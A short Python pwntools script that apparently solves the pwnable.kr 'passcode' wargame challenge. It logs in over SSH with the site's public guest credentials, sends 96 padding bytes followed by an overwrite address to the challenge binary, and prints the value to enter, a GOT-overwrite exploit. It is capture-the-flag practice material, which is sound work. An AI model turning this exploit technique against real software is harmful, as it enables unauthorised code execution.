from pwn import *
ss = ssh(host="pwnable.kr",port=2222,password="guest",user="passcode")

s = "\x00"*96 + "\x04\xa0\x04\x08"
p = ss.process("/home/passcode/passcode")
p.sendline(s)
print "enter 134514135"
p.interactive()
